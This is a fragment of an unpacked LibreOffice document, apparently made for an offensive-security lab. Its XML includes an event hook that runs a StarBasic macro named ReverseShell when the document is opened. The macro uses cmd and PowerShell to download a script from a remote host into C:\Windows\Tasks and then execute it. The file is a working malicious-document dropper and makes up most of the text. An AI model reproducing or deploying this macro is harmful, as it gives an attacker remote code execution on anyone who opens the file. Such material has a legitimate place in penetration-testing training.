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Offse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Offsec.ReverseShell?language=Basic&amp;location=document" xlink:type="simple"/>
    </office:event-listeners>
  </office:scripts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2842" officeooo:paragraph-rsid="001b2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d Bad Document for a Bad Bad fel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6:00:03.336144679</meta:creation-date>
    <dc:date>2022-09-23T16:05:17.050901294</dc:date>
    <meta:editing-duration>PT5M15S</meta:editing-duration>
    <meta:editing-cycles>2</meta:editing-cycles>
    <meta:generator>LibreOffice/7.4.1.1$Linux_X86_64 LibreOffice_project/40$Build-1</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="1" meta:paragraph-count="1" meta:word-count="8" meta:character-count="36" meta:non-whitespace-character-count="29"/>
  </office:meta>
</office:document-meta>
</file>

<file path=Basic/Standard/Offsec.xml><?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE module  PUBLIC '-//OpenOffice.org//DTD OfficeDocument 1.0//EN'  'module.dtd'>
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Offsec" script:language="StarBasic" script:moduleType="normal">REM  *****  BASIC  *****

Sub ReverseShell
	Shell("cmd /c powershell iwr http://192.168.49.77:80/offsec.ps1 -o C:\Windows\Tasks\offsec.ps1")
	Shell("cmd /c powershell -c C:\Windows\Tasks\offsec.ps1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ffse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